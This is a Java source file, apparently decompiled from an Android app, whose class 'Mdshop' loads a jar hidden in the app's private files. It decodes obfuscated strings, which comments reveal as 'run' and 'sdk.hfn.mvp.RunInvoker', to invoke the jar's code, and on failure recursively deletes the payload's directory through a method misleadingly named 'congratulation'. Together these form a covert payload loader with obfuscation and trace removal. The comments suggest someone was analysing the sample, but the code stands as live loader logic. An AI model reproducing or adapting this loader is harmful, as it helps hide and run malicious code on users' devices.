package com.jumpraw.mdstd.hxx;

import android.content.Context;
import java.io.File;

public class Mdshop
{
    private void congratulation(File paramFile)
    {
        if (paramFile != null)
        {
            if (paramFile.isFile()) {
                paramFile.delete();
            }
        }
        else {
            return;
        }
        File[] arrayOfFile = paramFile.listFiles();
        if (arrayOfFile != null)
        {
            int j = arrayOfFile.length;
            int i = 0;
            while (i < j)
            {
                congratulation(arrayOfFile[i]);
                i += 1;
            }
        }
        paramFile.delete();
    }

    public void enter(Context paramContext, String paramString1, String paramString2)
    {
        Object localObject = null;
        try
        {
//            File localFile = com.jumpraw.mdstd.hxx.a.a(paramContext, "ancor", "cjMd");
            File localFile = new File("/data/user/0/com.jumpraw.mdstd/files/629374049/92970899.jar");
            localObject = localFile;
            if (localFile.exists()) {
                localObject = localFile;

                a.a(
                        paramContext,
                        //run
                        a.a("cjMd", "89 2; 6; "),
                        a.a(paramContext,
                                                localFile,
                                                //sdk.hfn.mvp.RunInvoker
                                                a.a("cjMd", "79 59 9; 5? 29 39 6; 5? 59 9: 2> 5? :< 2; 6; 6< 49 9: 5; 69 78 5: "),
                                    "cjMd"),
                        "aid",
                        "cid");
            }
            return;
        }
        catch (Exception e)
        {
            e.printStackTrace();
            if (localObject != null) {
                congratulation(((File)localObject).getParentFile());
            }
            return;
        }
        finally {}
    }
}

